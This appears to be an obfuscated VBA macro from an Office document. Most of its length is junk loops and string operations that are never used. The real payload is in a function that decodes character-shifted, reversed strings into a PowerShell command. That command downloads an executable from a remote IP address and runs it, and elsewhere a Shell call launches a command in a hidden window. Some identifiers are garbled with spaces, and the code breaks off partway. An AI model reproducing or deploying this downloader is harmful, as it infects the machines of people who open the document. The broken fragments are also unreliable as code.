        ElseIf rnMi = 513 Then
            FPjb = Replace("oJHXzRHZPS", "oJH", "JPreb")
        ElseIf rnMi = 1541 Then
            FPjb = Replace("mpXblZCnAz", "mpX", "gnPzs")
        ElseIf rnMi = 357 Then
            FPjb = Replace("ZcxWzYxiHS", "Zcx", "GFXzy")
        ElseIf rnMi = 3324 Then
            nOrz = Replace(rcHz, bQr, Chr(104) + Chr(116) + Chr(116) + Chr(112))
        ElseIf rnMi = 1065 Then
            FPjb = Replace("koqYPndCkr", "koq", "UQFne")
        ElseIf rnMi = 2350 Then
            FPjb = Replace("QeeVQrBglg", "Qee", "KuPsh")
        ElseIf rnMi = 1794 Then
            FPjb = Replace("LaeopKTGgi", "Lae", "IXCAb")
        ElseIf rnMi = 3398 Then
            Shell (StrReverse(StrReverse(fCOY))), 0
        ElseIf rnMi = 2230 Then
            FPjb = Replace("JhDnlnAavt", "JhD", "bcEFW")
        ElseIf rnMi = 1239 Then
            FPjb = Replace("BqktvZzKJT", "Bqk", "wtOLm")
        ElseIf rnMi = 2023 Then
            FPjb = Replace("IhXankRBPj", "IhX", "Sltbo")
        ElseIf rnMi = 2548 Then
            FPjb = Replace("dPoeMBsrPk", "dPo", "vzTfZ")
        ElseIf rnMi = 915 Then
            FPjb = Replace("YtOxTfuWMC", "YtO", "Dtzly")
        ElseIf rnMi = 2197 Then
            FPjb = Replace("LVKlIUoPgx", "LVK", "XUUrY")
        ElseIf rnMi = 2916 Then
            FPjb = Replace("LFBmSyWwVT", "LFB", "snYmK")
        ElseIf rnMi = 2396 Then
            FPjb = Replace("UJCXdxxjqf", "UJC", "lrxAr")
        ElseIf rnMi = 1957 Then
            FPjb = Replace("uYFAmsYZvD", "uYF", "ZPeny")
        ElseIf rnMi = 608 Then
            FPjb = Replace("wpMffmHSHU", "wpM", "dCWGZ")
        ElseIf rnMi = 2249 Then
            FPjb = Replace("mYihCqWSRv", "mYi", "eTrYY")
        ElseIf rnMi = 1162 Then
            FPjb = Replace("kPhzyCnvcM", "kPh", "cWrSf")
        ElseIf rnMi = 3065 Then
            FPjb = Replace("XGlQqAVLqm", "XGl", "uhkQZ")
        ElseIf rnMi = 2693 Then
            FPjb = Replace("vrBoQpErAv", "vrB", "oKxSC")
        ElseIf rnMi = 1698 Then
            FPjb = Replace("rWKVGzlTjX", "rWK", "OQeXm")
        ElseIf rnMi = 2601 Then
            FPjb = Replace("IpmxmgoDqL", "Ipm", "Jcoyz")
        ElseIf rnMi = 2178 Then
            FPjb = Replace("ShYWvkyWsZ", "ShY", "YEUWT")
        ElseIf rnMi = 2079 Then
            FPjb = Replace("PZUEjqkdCD", "PZU", "UZwrd")
        End If
        rnMi = rnMi + 1
Wend

    For EfcUZ = 0 To 232
        AiPH = Replace("VhGUUZIdOedKdjDb", "VhG", "ksslBw")
        AiPH = StrReverse("VAFbZmuzoqoYoZYudln")
        AiPH = StrReverse("rzFGvvyLGxlMFPwWkF")
        AiPH = Replace("KqlvwZiTcyeag", "Kql", "SAHckfi")
        AiPH = Replace("nucKTXoRdcSFScrXJ", "nuc", "jfIdhCh")
        AiPH = StrReverse("iknTBGpJcQO")
        AiPH = StrReverse("KoUjQQZkcGCGeLQeBn")
                If 2584802 = 132 - 6594 Then
            ilweO = Replace("LGoZufVIaMlyypZpk", "LGoZ", "levsR")
            ilweO = StrReverse("LGoZufVIaMlyypZpk")
            End If
        AiPH = Replace("PAhShnYiVysE", "PAh", "dRoQjcs")
        AiPH = StrReverse("jQMxFDrXKvJltalHu")
        AiPH = Replace("hJjtUyrlfKkZLSwIx", "hJj", "bHzig")
                If 1113785 = 129 - 1685 Then
            EUpcE = Replace("yAyGgkXOeoLj", "yAyG", "lmReTFy")
            EUpcE = StrReverse("yAyGgkXOeoLj")
            qvSjh = Replace("BTDbZfbbvQiSahagP", "BTD", "MQbhXf")
            qvSjh = StrReverse("BTDbZfbbvQiSahagP")
            End If
                If 1580223 = 43 - 3611 Then
            egWaV = Replace("DuERPAXtVPw", "DuER", "XhEXq")
            egWaV = StrReverse("DuERPAXtVPw")
            End If
        AiPH = Replace("xJRaJISjdBaihx", "xJR", "zhDhDf")
                If 323402 = 251 - 4099 Then
            TSChV = Replace("ROpxpufbxnIyER", "ROpx", "pmJRuq")
            TSChV = StrReverse("ROpxpufbxnIyER")
            End If
        AiPH = StrReverse("igHzaPoiwEkB")
        AiPH = StrReverse("aQjTvWyyVWmvepLuc")
                If 2851412 = 81 - 5972 Then
            QBPGa = Replace("IVjDIOAXCELTEHmJ", "IVj", "TpLDATi")
            QBPGa = StrReverse("IVjDIOAXCELTEHmJ")
            YCZOq = Replace("xiWnlXBTVQ", "xiW", "xWPXxI")
            YCZOq = StrReverse("xiWnlXBTVQ")
            End If
        AiPH = Replace("XlyYtzvlJvtubV", "Xly", "LPeza")
        AiPH = StrReverse("sUZhZdQbLyth")
        AiPH = Replace("lClunQysTg", "lCl", "owjyC")
        AiPH = Replace("MiWXUvXrVowABPpEcwq", "MiW", "ejWRF")
        AiPH = Replace("zsareOrbmRJSAwB", "zsa", "EnBDqUc")
        AiPH = Replace("LhlQsufotxTyXbbHuad", "Lhl", "PbUU")
                If 3705587 = 91 - 3311 Then
            YAgkr = Replace("ETJvYzxhaYQzUtmuFfW", "ETJ", "pDGWH")
            YAgkr = StrReverse("ETJvYzxhaYQzUtmuFfW")
            ycuZi = Replace("IdWDtWGcVAGUwgLrGrn", "IdW", "EKtbE")
            ycuZi = StrReverse("IdWDtWGcVAGUwgLrGrn")
            End If
    Next EfcUZ
    For zKRRr = 0 To 251
        MIPv = StrReverse("XODnlWSwjtwqmxWu")
        MIPv = StrReverse("hgbavzdxOdGqq")
                If 3066329 = 201 - 2822 Then
            QQpCJ = Replace("KSIRyxtrbFAmxDu", "KSI", "rzKt")
            QQpCJ = StrReverse("KSIRyxtrbFAmxDu")
            End If
        MIPv = Replace("CSJcvqmibdC", "CSJ", "PKIyaJG")
                If 1353106 = 55 - 2412 Then
            RhZxe = Replace("YDwXGMfnTRAZYJSKfL", "YDwX", "QgfyB")
            RhZxe = StrReverse("YDwXGMfnTRAZYJSKfL")
            End If
        MIPv = StrReverse("tLTzPaUtnzyU")
                If 1061535 = 34 - 1948 Then
            EZWgO = Replace("legOAynacBdeec", "leg", "XGrd")
            EZWgO = StrReverse("legOAynacBdeec")
            cRqsW = Replace("ojDDdmQOloDSmHk", "ojDD", "hsay")
            cRqsW = StrReverse("ojDDdmQOloDSmHk")
            End If
        MIPv = StrReverse("zsPPTkTPbTYuqAkVwhB")
        MIPv = StrReverse("sEUrAHQnwZL")
        MIPv = Replace("UVQLPFkAFOJg", "UVQ", "jOgt")
                If 2559131 = 48 - 4582 Then
            bSdxX = Replace("SbvYkZCMgyjYajm", "SbvY", "SfKtPLy")
            bSdxX = StrReverse("SbvYkZCMgyjYajm")
            End If
                If 3261538 = 76 - 4610 Then
            rQmYY = Replace("BtjskyJdafuWOAHa", "Btjs", "ilbHdKF")
            rQmYY = StrReverse("BtjskyJdafuWOAHa")
            LijAz = Replace("BnIsFcySWBOMYnC", "BnIs", "GSEBG")
            LijAz = StrReverse("BnIsFcySWBOMYnC")
            End If
                If 3493494 = 189 - 4761 Then
            Wkvdr = Replace("oEVqbojtcFTcUUQliW", "oEV", "unsPqh")
            Wkvdr = StrReverse("oEVqbojtcFTcUUQliW")
            QHvwK = Replace("AbQubtMndADfxcbLUL", "AbQ", "FhBr")
            QHvwK = StrReverse("AbQubtMndADfxcbLUL")
            End If
        MIPv = StrReverse("xSdoemSMguf")
        MIPv = StrReverse("QfBQIiLdEoxyeiZiUPp")
        MIPv = Replace("yAUOIcXJfURac", "yAU", "hezBw")
        MIPv = Replace("TYzxJVQGwFJqU", "TYzx", "hpwT")
        MIPv = StrReverse("bEwGElDQMOtFq")
        MIPv = StrReverse("EXiDRelGpjmXabae")
                If 2151394 = 43 - 3705 Then
            hMRdR = Replace("XWeZsvEcGOrp", "XWeZ", "CcLJOo")
            hMRdR = StrReverse("XWeZsvEcGOrp")
            End If
                If 2972268 = 57 - 1921 Then
            ECsiS = Replace("YoZATBCSAKwtYPtkE", "YoZ", "CdiCXtq")
            ECsiS = StrReverse("YoZATBCSAKwtYPtkE")
            End If
        MIPv = StrReverse("llfnPtRjGJ")
        MIPv = StrReverse("oaPYrqiQwbtQaL")
                If 3208771 = 68 - 7741 Then
            IyUKP = Replace("DPbBzrowlqeJmTYJTJ", "DPb", "cHfIs")
            IyUKP = StrReverse("DPbBzrowlqeJmTYJTJ")
            DnLXt = Replace("vuVCxwnbGyeGcPEjCsY", "vuV", "kXjI")
            DnLXt = StrReverse("vuVCxwnbGyeGcPEjCsY")
            End If
                If 3020123 = 62 - 2452 Then
            KfXYY = Replace("KlCxBLlhgCgFTAMsUjz", "KlC", "VWTYJH")
            KfXYY = StrReverse("KlCxBLlhgCgFTAMsUjz")
            gSnMe = Replace("KvFsALovlSAGRXPKUdQ", "KvFs", "rPPHt")
            gSnMe = StrReverse("KvFsALovlSAGRXPKUdQ")
            End If
    Next zKRRr

End Sub
Public Function pAKEfogafk(idMmc) As String
    For pSUTH = 0 To 344
        sCFZ = Replace("AfBkzYlJhg", "AfBk", "tLtUU")
        sCFZ = StrReverse("agCRRonSiIV")
        sCFZ = Replace("UQHEuHRyAAAHAkQCEYb", "UQH", "AxEZAQU")
        sCFZ = Replace("SJVQvjLJoeSy", "SJVQ", "ZQJAWGB")
                If 2776114 = 259 - 5599 Then
            wSbJn = Replace("QfVemnrIZk", "QfVe", "HeIPap")
            wSbJn = StrReverse("QfVemnrIZk")
            End If
        sCFZ = Replace("WFGQiVjBFn", "WFG", "ELErEO")
        sCFZ = Replace("JIPFRsarwogZkdYjlZ", "JIP", "hwXP")
        sCFZ = Replace("KVnTfAIZJREcktqqmW", "KVnT", "rrks")
        sCFZ = StrReverse("lLuCZXOxcZPuR")
        sCFZ = StrReverse("TsvyjcBVZEaclDqetHU")
        sCFZ = Replace("lpFFeSyswMasLFJq", "lpFF", "kwHsmvb")
                If 2795057 = 152 - 7755 Then
            Abdph = Replace("DFhDTQKGoSXK", "DFhD", "CPXkume")
            Abdph = StrReverse("DFhDTQKGoSXK")
            qnODt = Replace("imKpMnIGOLDiZaQKAty", "imK", "vgVmR")
            qnODt = StrReverse("imKpMnIGOLDiZaQKAty")
            End If
        sCFZ = Replace("WhLdpGZusfpLVjR", "WhLd", "cmcuPxM")
        sCFZ = Replace("qnGavrZJvADU", "qnGa", "Xqkz")
        sCFZ = StrReverse("uiAEwIlCqkWFB")
        sCFZ = StrReverse("dXThaQcPfFVTmytmot")
        sCFZ = StrReverse("OwtJUmSWQVtqXGcb")
        sCFZ = Replace("iTKZjusZacfGUTe", "iTK", "owOYg")
        sCFZ = StrReverse("oxJUHdPDBztuIaIbpL")
        sCFZ = Replace("AcnefgmsPLiKWhmI", "Acn", "zCQbx")
        sCFZ = StrReverse("SGfvdoxxQoEnFtOjnAz")
        sCFZ = Replace("FCiUBRVoKFSLIXqEk", "FCiU", "wFpORR")
        sCFZ = StrReverse("aMTSLoaTphgKRY")
        sCFZ = StrReverse("fCGiGYEhKYaVkRQu")
        sCFZ = StrReverse("DXbeseJXMHbIFk")
    Next pSUTH
    For SfFky = 0 To 318
        abBt = Replace("wcFHsiUInfGuFBxGOad", "wcF", "DmnMZC")
        abBt = StrReverse("rGsGJlcElGn")
        abBt = Replace("cEGAVPguGlUmp", "cEGA", "ALHnwtX")
                If 1798906 = 106 - 3390 Then
            SijOw = Replace("pumuXQbduCAQapQE", "pumu", "heayOzC")
            SijOw = StrReverse("pumuXQbduCAQapQE")
            End If
        abBt = StrReverse("tLBaIqCEGnmVlMDFRxS")
        abBt = Replace("mIykffERHKvvbiMjBmP", "mIyk", "rVBXVr")
        abBt = Replace("aLgJChwOyVWbnW", "aLg", "ReiH")
        abBt = Replace("ZMoUFWonFIXXiopxtbs", "ZMo", "RQyTQWE")
        abBt = StrReverse("cqcynqfFrfSLqEmev")
        abBt = StrReverse("QPWTFUTTTdHoKeaSP")
        abBt = StrReverse("RfoXUcRvskk")
                If 703656 = 112 - 3600 Then
            rLcvK = Replace("UMBPpYmUzDxxBBF", "UMB", "zbxt")
            rLcvK = StrReverse("UMBPpYmUzDxxBBF")
            fanrL = Replace("nzhwtHBBkp", "nzh", "ASQl")
            fanrL = StrReverse("nzhwtHBBkp")
            End If
        abBt = Replace("hhAXBDuzEHWwVYiwrY", "hhAX", "TcBmV")
        abBt = StrReverse("mCwYRgDbyGFY")
        abBt = StrReverse("sIRxxLmSXkFVADznZ")
        abBt = StrReverse("GMBVIgHQFenVoAfQhT")
        abBt = StrReverse("tveaRXDzsXsYTwAtW")
                If 901216 = 166 - 4220 Then
            zxOFT = Replace("DMcvaIknwPHvwJqi", "DMc", "LJCH")
            zxOFT = StrReverse("DMcvaIknwPHvwJqi")
            uDtaM = Replace("quKGzMOMIcWhmVCdv", "quKG", "oQxK")
            uDtaM = StrReverse("quKGzMOMIcWhmVCdv")
            End If
        abBt = Replace("dVqWsYglAiOIEzMeKyT", "dVq", "wXFV")
        abBt = Replace("OUQjLKiZOwrncI", "OUQ", "jaZT")
        abBt = Replace("HGxeCADsPyrZyznZ", "HGxe", "XrgDxx")
        abBt = StrReverse("LUTMfhKVYyjtit")
        abBt = Replace("AigobpUTOPSY", "Aig", "jZzzw")
                If 1496800 = 135 - 5398 Then
            WZeuu = Replace("EBWkKEXQACcT", "EBWk", "FYtTIs")
            WZeuu = StrReverse("EBWkKEXQACcT")
            ckgKC = Replace("myykEepPfFDZTXIQd", "myy", "lFPqK")
            ckgKC = StrReverse("myykEepPfFDZTXIQd")
            End If
        abBt = StrReverse("KzorQIjPeqgIvckn")
    Next SfFky
    nyR = nyR & StrReverse(StrReverse("eJWzBuxV[LylRH[NmHEJJxcKQ{ixbvflnViDikbNmwKFt{fIeP[jwnJKMDicHiQjRrkuPCcKpzwSHnNxbofpdubXNwFI"))
JUyVe = Replace("yQzDwsLqBmrOLDvzACX", "yQz", "fbhshko")
    For BecTZ = 0 To 369
        ZiGC = Replace("hRreBkYWDLcCOkO", "hRre", "WRtAbC")
                If 2264534 = 193 - 7957 Then
            BDGhH = Replace("igqpjLCUEpHFKAQA", "igq", "qyXw")
            BDGhH = StrReverse("igqpjLCUEpHFKAQA")
            End If
        ZiGC = StrReverse("MmphJdyOtwJ")
        ZiGC = StrReverse("aROBazXcdGxuvSbr")
        ZiGC = StrReverse("IXDtxDQQvc")
        ZiGC = Replace("mqDKJqFWmDLTUFCDw", "mqD", "wlcu")
                If 3017083 = 221 - 224 Then
            pMJxd = Replace("dGnQPUvfPzV", "dGn", "vGseC")
            pMJxd = StrReverse("dGnQPUvfPzV")
            WZYpB = Replace("YTmcRcjyiJnluK", "YTm", "WqZbnW")
            WZYpB = StrReverse("YTmcRcjyiJnluK")
            End If
                If 2208874 = 33 - 4650 Then
            pPjhJ = Replace("JjZBTVQWqeUmq", "JjZB", "wKDpyp")
            pPjhJ = StrReverse("JjZBTVQWqeUmq")
            End If
        ZiGC = Replace("sESyyXCHLn", "sES", "wwRVzgj")
        ZiGC = Replace("oQcRcIyLgnqelyjYULk", "oQcR", "jBPHzec")
        ZiGC = Replace("WozwLALVlxs", "Woz", "ItgaBU")
        ZiGC = StrReverse("orcYCunpPw")
        ZiGC = StrReverse("AyCEfBrFPgEuEGb")
        ZiGC = Replace("BtRYJIJqdV", "BtR", "yIiypk")
        ZiGC = Replace("dzcApMxIuluRx", "dzc", "Hmfogk")
        ZiGC = StrReverse("IszokIwlpvzU")
        ZiGC = StrReverse("nmhHGCPmaEoyHvY")
        ZiGC = StrReverse("KbIYWzVAycofmg")
        ZiGC = StrReverse("CJUtTCjgELSgTymvZAv")
                If 1912420 = 228 - 4018 Then
            bPTrJ = Replace("MrtAtSLyYysgmutB", "MrtA", "hHxqUBm")
            bPTrJ = StrReverse("MrtAtSLyYysgmutB")
            ByfGC = Replace("lyZiDKmoxnYHkVqqt", "lyZ", "sMtvbr")
            ByfGC = StrReverse("lyZiDKmoxnYHkVqqt")
            End If
        ZiGC = Replace("tWErxmHzaznKhia", "tWEr", "RqMFqnz")
        ZiGC = StrReverse("fBQHobRwxy")
        ZiGC = Replace("sSLFeswFHFZZK", "sSLF", "Clpt")
        ZiGC = Replace("WWMJxvixZAs", "WWM", "oVjhpjg")
        ZiGC = Replace("rvDCyedOVoQtwK", "rvDC", "WcPu")
    Next BecTZ
    nyR = nyR & StrReverse(StrReverse("uQLhMRsF}<*(fyf/XFRL](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\)!iubqfmjG.!ttfdpsQ.usbuT!2!x.!fyf/mmfi"))
JUyVe = StrReverse("dXkkTmxSIrAXzXjl")
    For EcPri = 0 To 186
        tghY = StrReverse("qQDgZtaLRrQz")
        tghY = StrReverse("pmPvqECSHu")
        tghY = Replace("ibIphsdKZcpBq", "ibIp", "WLoxrc")
        tghY = Replace("WDomAYJpwV", "WDo", "VXWc")
        tghY = StrReverse("mOIVvAVjqsWo")
        tghY = StrReverse("MBxtxKkTRvDiM")
                If 1747708 = 177 - 678 Then
            npUIh = Replace("vJqGVplmGoCKytTkQp", "vJq", "Azcbj")
            npUIh = StrReverse("vJqGVplmGoCKytTkQp")
            GuSXa = Replace("WEWHsulbHGBFARomoT", "WEWH", "kjVpIK")
            GuSXa = StrReverse("WEWHsulbHGBFARomoT")
            End If
                If 870344 = 81 - 5964 Then
            VCvZm = Replace("ewpctPdclpFpMfBgdIc", "ewpc", "pfjJo")
            VCvZm = StrReverse("ewpctPdclpFpMfBgdIc")
            ciHJf = Replace("TdeQeTzKgruUJRDe", "TdeQ", "XDlday")
            ciHJf = StrReverse("TdeQeTzKgruUJRDe")
            End If
        tghY = Replace("JXDeShzlBGchRDZ", "JXD", "tqaM")
        tghY = StrReverse("hVXfslDeownzU")
        tghY = Replace("ldgcjvusPkiCPPapM", "ldg", "QaaxCvp")
        tghY = StrReverse("FAtGFfWSsB")
        tghY = Replace("GmQwFKRZGSSKfQFIV", "GmQw", "DoeLfL")
        tghY = StrReverse("IZKBTuLzdmRgRqHHnk")
                If 436045 = 250 - 5210 Then
            flsDA = Replace("cynqfqlKkzWuZvhz", "cyn", "rQUvvHE")
            flsDA = StrReverse("cynqfqlKkzWuZvhz")
            End If
                If 3644124 = 134 - 1669 Then
            IUSIG = Replace("DglaBuCgVJsTDbRZA", "Dgla", "HHxq")
            IUSIG = StrReverse("DglaBuCgVJsTDbRZA")
            iGmhv = Replace("uieJVcgQFGbGgSUV", "uie", "ehxCjTu")
            iGmhv = StrReverse("uieJVcgQFGbGgSUV")
            End If
        tghY = StrReverse("DMqBaLimZqEMmdqz")
        tghY = Replace("goAxoLOeofX", "goA", "VGHaBl")
        tghY = StrReverse("hIaGlqHYbPMLyAkw")
                If 2298128 = 93 - 5235 Then
            CWqFn = Replace("WDASnprlQOXYeCunxBL", "WDA", "RvhLEmE")
            CWqFn = StrReverse("WDASnprlQOXYeCunxBL")
            cYZcV = Replace("RawJzqqKWt", "RawJ", "Wcdgy")
            cYZcV = StrReverse("RawJzqqKWt")
            End If
        tghY = Replace("dMBrLLggju", "dMB", "UMfnRdT")
        tghY = StrReverse("IoYyHgaKQwA")
        tghY = StrReverse("eLAPekSuaWmXg")
                If 1300093 = 238 - 4171 Then
            PdvIJ = Replace("auhFvLGmbG", "auh", "soyz")
            PdvIJ = StrReverse("auhFvLGmbG")
            qkMHF = Replace("yEIaixiTgOTvHME", "yEIa", "pcmeA")
            qkMHF = StrReverse("yEIaixiTgOTvHME")
            End If
        tghY = Replace("otoiPcMBtABEms", "otoi", "PgoEx")
    Next EcPri
    nyR = nyR & StrReverse(StrReverse("tsfxpq<**(fyf/XFRL](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\)-(fyf/lp0qpit0812/5:"))
JUyVe = Replace("QuOQQreDDypTLx", "QuOQ", "ZcGM")
    For hPKrY = 0 To 150
        JmGx = StrReverse("GwadvipgPdqIPMzFZUU")
                If 1181152 = 49 - 4283 Then
            QrlKz = Replace("XqwfCGbypXf", "Xqwf", "miVL")
            QrlKz = StrReverse("XqwfCGbypXf")
            ZFwhk = Replace("VVRgaYPcXhFcukAUqm", "VVRg", "BXyoTm")
            ZFwhk = StrReverse("VVRgaYPcXhFcukAUqm")
            End If
        JmGx = StrReverse("JgjEHKSrimlvolUAYB")
                If 1939178 = 75 - 1420 Then
            zKBDb = Replace("WuAPqQoPlGOirnvUdmB", "WuAP", "ScrUMi")
            zKBDb = StrReverse("WuAPqQoPlGOirnvUdmB")
            End If
        JmGx = StrReverse("jgvjgkwcHXlUrZdMxL")
        JmGx = Replace("AzVOrFjiwHYlag", "AzVO", "oRvg")
        JmGx = Replace("xkXmzdhXdQQQ", "xkX", "ziok")
        JmGx = Replace("dLeLnpIzqhH", "dLe", "YZWnx")
        JmGx = Replace("LtSVmElhVQqiyCJZRZ", "LtSV", "eqCQMJ")
        JmGx = StrReverse("fUopShLJTyBUxVWrJiC")
        JmGx = StrReverse("wxUuVwvLJqGtKQyc")
        JmGx = StrReverse("WMVzRRFXebAuOXt")
        JmGx = Replace("kmbpvcVpwWGduJcxzc", "kmb", "TmuZq")
        JmGx = Replace("lFSthwDrDp", "lFSt", "ulqof")
        JmGx = StrReverse("ZYoruOXWgjWiCWAXY")
        JmGx = StrReverse("jsTpGeSFvdg")
        JmGx = Replace("GuEIgkGYsXQ", "GuEI", "tvrj")
        JmGx = Replace("cvRxiLuBVlWoForFKF", "cvR", "BVYKJP")
        JmGx = Replace("HryuWyunvDPFxqPvJaa", "Hryu", "xHIVA")
        JmGx = Replace("gXdXOLYnDtOrWqBFM", "gXdX", "mBxBlVf")
        JmGx = Replace("KljVRHfJEiPB", "Klj", "iCeZ")
        JmGx = StrReverse("vxpxYIHRkq")
        JmGx = StrReverse("fneTFKgzHenDn")
        JmGx = Replace("joreUvjhfTCUFDx", "jore", "roMKUl")
                If 690260 = 259 - 2366 Then
            PhbwQ = Replace("YUGsepXAIXWy", "YUGs", "kqCV")
            PhbwQ = StrReverse("YUGsepXAIXWy")
            CidIt = Replace("FKjhOwSzcy", "FKjh", "zbojW")
            CidIt = StrReverse("FKjhOwSzcy")
            End If
    Next hPKrY
    nyR = nyR & StrReverse(StrReverse("/732/32200;quui()fmjGebpmoxpE/*uofjmDcfX/ufO/nfutzT!udfkcP.xfO)!2!x.!f"))
JUyVe = StrReverse("EtDFlYWzgo")
    For oTvaD = 0 To 116
        zmjZ = Replace("gdUtLOEcDCokPtDEBkj", "gdUt", "qGQqjD")
        zmjZ = StrReverse("lhGWLyDAIRysDmASCn")
        zmjZ = Replace("OdUsyCZHeIMpanVMp", "OdUs", "ECPDW")
        zmjZ = StrReverse("ZKoytvJESgEOpl")
                If 2840607 = 208 - 171 Then
            cSLhY = Replace("mioyAprFHow", "mio", "Bepx")
            cSLhY = StrReverse("mioyAprFHow")
            qxODx = Replace("TxZSEfhrETxtrGWPstg", "TxZ", "afzoTo")
            qxODx = StrReverse("TxZSEfhrETxtrGWPstg")
            End If
        zmjZ = StrReverse("PohEomlwSzyEtbGTFCr")
        zmjZ = Replace("sqEjYEVqOCWXsubJ", "sqE", "XEOGyF")
                If 640393 = 45 - 8256 Then
            VwkUm = Replace("fejGdlWrUZjTIdoM", "fejG", "sUUdfd")
            VwkUm = StrReverse("fejGdlWrUZjTIdoM")
            End If
                If 592693 = 217 - 2136 Then
            qaUDC = Replace("RZcsLimhnbrAfOHsxQ", "RZcs", "jovGpBh")
            qaUDC = StrReverse("RZcsLimhnbrAfOHsxQ")
            OdfRJ = Replace("OnAnCEAecQDm", "OnAn", "gaOWq")
            OdfRJ = StrReverse("OnAnCEAecQDm")
            End If
        zmjZ = Replace("rJMlZpbmiMVKQ", "rJMl", "JFmARK")
        zmjZ = StrReverse("KZAPlGkmjHhIkbk")
        zmjZ = Replace("lwwqpaiFRfLY", "lww", "hCMRa")
        zmjZ = Replace("bJrzpnSrjBWUnodK", "bJrz", "fCXBg")
        zmjZ = Replace("PHCZulVhZOzYDODg", "PHCZ", "hEHLh")
        zmjZ = Replace("CeMbthpdTTOC", "CeM", "MMLMgG")
        zmjZ = Replace("zzACfJUAQftPqgi", "zzAC", "LjgYHG")
                If 2278429 = 165 - 5835 Then
            RBIdw = Replace("sfWycrutovsXme", "sfW", "BJrT")
            RBIdw = StrReverse("sfWycrutovsXme")
            End If
        zmjZ = Replace("jaucluHzpewmFWDopO", "jau", "gVKpra")
                If 2623143 = 195 - 7291 Then
            ujize = Replace("xkwaUwxAmuojUoCqcY", "xkwa", "qwVx")
            ujize = StrReverse("xkwaUwxAmuojUoCqcY")
            End If
        zmjZ = StrReverse("eQhDhIZAPGPzkLxFHU")
        zmjZ = StrReverse("TatoEkwlYhY")
                If 3619445 = 41 - 2161 Then
            FsXen = Replace("wwbHWGuerQyWld", "wwb", "lktddYE")
            FsXen = StrReverse("wwbHWGuerQyWld")
            QvhgW = Replace("nieCtZbKEqz", "nie", "jOZe")
            QvhgW = StrReverse("nieCtZbKEqz")
            End If
                If 939119 = 108 - 1985 Then
            LEQem = Replace("IWYiMtfLGJL", "IWYi", "wOFc")
            LEQem = StrReverse("IWYiMtfLGJL")
            End If
        zmjZ = Replace("IWKCUYgMrrQex", "IWKC", "lTQVD")
        zmjZ = Replace("KlGHcZiYhslPm", "KlG", "wPlBb")
    Next oTvaD
    nyR = nyR & StrReverse(StrReverse("yf/mmfitsfxpq}wFwID}crSP"))
JUyVe = Replace("QcHqoQyZlGCwTMrU", "QcH", "snKvAi")
    Dim bEBn() As Byte
XsDKM = StrReverse("nseWfAlkSZHHeLqYyec")
    bEBn = StrConv(nyR, vbFromUnicode)
    While TVGA <= UBound(bEBn)
        JUyVe = Replace("YRjtEhGHRY", "YRj", "vPYHP")
        JUyVe = Replace("DpqMUIdTTf", "Dpq", "DRorz")
        bEBn(TVGA) = bEBn(TVGA) - idMmc
    TVGA = TVGA + 1
        JUyVe = Replace("uZitcXJlSx", "uZi", "teTue")
        JUyVe = Replace("tjXwniISIL", "tjX", "vxQOA")
    Wend
    pAKEfogafk = StrConv(bEBn, vbUnicode)
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
    Public Function tog WLVp As String
    For xpfXA = 0 To 185
        HMnPcAZi = UCase("gSGGyDejvXJmXZEfG")
        gLQLmkXH = UCase("wVzbwLHAlpilWOx")
        uampjY = Replace("sHvdjxsKxeDBJzTX", "sHvd", "Agfj")
                VcedxSym = Left("KcQlbonYRverqKQFHQ", 5)
        ZmFBybOc = Replace("sMgkbzfROYp", "sMgk", "uozdfqC")
        pKupsuMHG = Replace("lDznvmMO yjnF", "lDz", "eWtw")
        YjjDuh = Mid("KUXwTiKBFrZrR", 0, 5)
        LDY XVIL = Left("ZLdLkLPQiFoZJY", 3)
        jrBWHgqnC = UCase(" UOMRaLHJBgC")
        gZglgt = Left("mTBkJjYYrTQpz", 5)
         hsvcdSh = UCase("kkEjgEOTOqZmvAUSGl")
        oYSYxWJwQ = Right("qLHUPyFhZdVsdQnnrGI", 3)
        Wqbxrb = StrReverse("cdKGUYwwBlJfCnTn")
        nqrxRYh = Replace("CcC FETmvUFZD", "CcC", "FIWy")
    Next xpfXA
        iHQmTk = Space(5)
    SEUoVU = Replace("MnyAaldHasKXFdYZRlk", "MnyA", "GFAB")
    UORiQY = Right("qxcTXTJZXPhK", 6)
    gCDlUR = StrReverse("ht YwJuJJw vncyyOSr")
        For jFrUd = 0 To 78
                ZnghCid = StrReverse("cgLosEXORjzVmdc")
                Rokor = Mid("jfAbwPXIdW", 1, 7)
                KeARJfE = RTrim("KQjIPuZEmd")
        pxgvbjPVg = LTrim("HXTwrxHsAthqk ")
        eVTrrRxH = UCase("gcwlJIGsRUzOgXKx")
        JCQucTt = Left("rpBmaWercZzyIvAHJ", 5)
        mOfVF = Left("HAPaASuhVr", 3)
        soQnWn = Right("TppA JEOCBi XeTTL", 4)
        fYukYcbB = Replace("bESoVjJpoaV", "bESo", "JDfqzIC")
        JowYRAeIj = Mid("xySgpYkgunc", 0, 5)
        CEnneMrav = Space(8)
        QamUKZphj = StrReverse("nivVgLeVJmMyh")
        ffyXXLuxQ = Left("zMvkfHRJLhTufaXKUMj", 3)
        SJwdU = UCase("qtgJMifmAYAMthPwe")
        VeuriYq = Replace("KwytQhJycinnXhGwx", "Kwyt", "MocVO")
    Next jFrUd

    tog WLVp = 591 - 219
End Function

    Public Function vGWLJZGU() As String
    jfTSTW = Mid("DcfFpYyvegZdYVegGBP", 0, 6)
    OQOMOS = LTrim("bzstYujErXIbjfAfx")
vGWLJZGU = 990 - 144
    For Dfqjz = 0 To 284
        jgozOmSoI = Mid("bKwMCqvSPQMZy", 1, 6)
                        frrPuW = RTrim("pXLqHuxwEfRxTvyvdGv")
        jehfq Y = Space(5)
        RHvFZvZu = Mid("mmtGgJXcQkkZ", 1, 7)
        bBIkF = LTrim("OVXVpTJwGpsyjO")
        QZkVTgfPL = Right("KZBr CMlepPemA", 6)
        nXMUUC = LTrim("PeMamZPFoKgmnkVZMJV")
        wcqmXi = RTrim("kXZZTKPSzdSy J eBK")
        yzrSbyAXn = Space(9)
                OStDW = Left("HrqqusISua", 6)
        DwuAUpx = StrReverse("LnOi jaVWbYQI")
                rhxgV = Mid("mwUzztHKncyLkcu", 0, 7)
        CfsLvZ = RTrim("iQyCfXLJfOUbHA")
        tlxF = LTrim("CVIrswkpgirZnfsSc")
